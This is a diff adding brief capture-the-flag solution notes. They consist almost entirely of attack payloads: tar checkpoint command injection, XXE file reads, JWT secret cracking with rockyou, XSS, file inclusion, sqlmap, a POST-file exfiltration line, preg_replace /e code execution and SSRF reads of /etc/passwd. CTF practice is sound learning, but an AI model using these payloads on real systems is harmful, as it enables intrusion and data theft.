@@ -1,0 +1,52 @@
+tartarsausage:
+cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="ls -l"
+
+cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat path/flag"
+
+syntax-check:
+<?xml version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE foo [
+	<!ELEMENT foo ANY>
+	<!ENTITY xxe SYSTEM
+	"file:///var/www/html/flag">
+	]>
+	<foo>
+		&xxe;
+	</foo>                           -this as the first try(wrong encoding)
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE foo [
+	<!ELEMENT foo ANY>
+	<!ENTITY xxe SYSTEM
+	"php://filter/convert.base64-encode/resource=/var/www/html/flag">
+	]>
+	<foo>
+		&xxe;
+	</foo>                          -correct encoding
+
+under construction:
+python3 jwt_tool.py -t http://35.198.135.192:32749/admin -rc "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwiaWF0IjoxNjk0OTQ0ODIzLCJleHAiOjE2OTUwMzEyMjN9.EGNFWcsnowg-VdCECTgdMznMUbf7k9kR7NI40qg-JU8" -C -d '/home/kali/Desktop/rockyou.txt' 
+
+manual-review:
+<script>window.location.href='link/flag';</script>
+
+alien-inclusion:
+curl 'http://35.246.134.224:30604/?start=' --data 'start=flag.php'
+
+small-data-leak:
+sqlmap -u http://35.246.158.241:31089:???? --dbs
+
+downloader-v1:
+link/test.php --post-file '/var/www/html/flag.php'
+
+substitute:
+http://34.107.123.245:31050/index.php?vector=/Admin/e&replace=system('ls -l')
+http://34.107.123.245:31050/index.php?vector=/Admin/e&replace=system('cat path/flag')
+
+ultra crawl:
+file:///etc/passwd
+host changed to - company.tld
+file:///home/ctf/app.py
+
+
+
